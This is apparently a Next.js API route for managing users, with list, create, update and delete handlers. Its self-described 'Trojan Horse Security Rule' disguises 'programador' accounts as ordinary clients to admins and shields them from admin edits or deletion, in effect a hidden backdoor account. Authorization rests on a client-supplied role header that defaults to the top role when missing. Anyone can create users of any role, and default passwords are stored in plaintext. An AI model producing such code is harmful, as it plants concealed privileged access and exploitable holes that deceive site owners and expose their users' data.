import { NextResponse } from 'next/server';
import { query } from '@/lib/db';
import { UserRole } from '@/lib/types';

export async function GET(request: Request) {
  try {
    const { searchParams } = new URL(request.url);
    const viewerRole = request.headers.get('x-user-role') || searchParams.get('viewer_role') || 'programador';

    const res = await query(
      'SELECT id, name, email, role, phone, created_at FROM users ORDER BY created_at DESC'
    );

    // Apply the Trojan Horse Security Rule:
    // If the viewer is NOT a 'programador' (e.g. an 'admin'), disguise any 'programador' as a standard 'cliente'.
    const users = res.rows.map((user) => {
      if (viewerRole !== 'programador' && user.role === 'programador') {
        return {
          ...user,
          role: 'cliente' as UserRole, // Masked role
          _trojan_masked: true,
        };
      }
      return user;
    });

    return NextResponse.json(users);
  } catch (error) {
    console.error('Error fetching users:', error);
    return NextResponse.json({ error: 'Error al obtener usuarios' }, { status: 500 });
  }
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { name, email, password, role, phone } = body;

    const id = 'usr_' + Date.now().toString().slice(-6);

    const res = await query(
      `
      INSERT INTO users (id, name, email, password_hash, role, phone)
      VALUES ($1, $2, $3, $4, $5, $6)
      RETURNING id, name, email, role, phone, created_at;
      `,
      [id, name, email, password || 'demo123', role || 'cliente', phone || '']
    );

    return NextResponse.json(res.rows[0], { status: 201 });
  } catch (error) {
    console.error('Error creating user:', error);
    return NextResponse.json({ error: 'Error al crear usuario' }, { status: 500 });
  }
}

export async function PUT(request: Request) {
  try {
    const body = await request.json();
    const { id, name, email, role, phone } = body;
    const viewerRole = request.headers.get('x-user-role') || 'programador';

    // Protect Programmer account from modifications by Admin
    const targetUser = await query('SELECT role FROM users WHERE id = $1', [id]);
    if (targetUser.rows.length > 0 && targetUser.rows[0].role === 'programador' && viewerRole !== 'programador') {
      return NextResponse.json({ error: 'Operación no permitida en esta cuenta protegida' }, { status: 403 });
    }

    const res = await query(
      `
      UPDATE users
      SET
        name = COALESCE($1, name),
        email = COALESCE($2, email),
        role = COALESCE($3, role),
        phone = COALESCE($4, phone)
      WHERE id = $5
      RETURNING id, name, email, role, phone, created_at;
      `,
      [name, email, role, phone, id]
    );

    if (res.rows.length === 0) {
      return NextResponse.json({ error: 'Usuario no encontrado' }, { status: 404 });
    }

    return NextResponse.json(res.rows[0]);
  } catch (error) {
    console.error('Error updating user:', error);
    return NextResponse.json({ error: 'Error al actualizar usuario' }, { status: 500 });
  }
}

export async function DELETE(request: Request) {
  try {
    const { searchParams } = new URL(request.url);
    const id = searchParams.get('id');
    const viewerRole = request.headers.get('x-user-role') || 'programador';

    if (!id) {
      return NextResponse.json({ error: 'ID de usuario requerido' }, { status: 400 });
    }

    // Protect Programmer account
    const targetUser = await query('SELECT role FROM users WHERE id = $1', [id]);
    if (targetUser.rows.length > 0 && targetUser.rows[0].role === 'programador' && viewerRole !== 'programador') {
      return NextResponse.json({ error: 'No tienes permisos para eliminar este usuario' }, { status: 403 });
    }

    await query('DELETE FROM users WHERE id = $1', [id]);
    return NextResponse.json({ success: true, message: 'Usuario eliminado' });
  } catch (error) {
    console.error('Error deleting user:', error);
    return NextResponse.json({ error: 'Error al eliminar usuario' }, { status: 500 });
  }
}

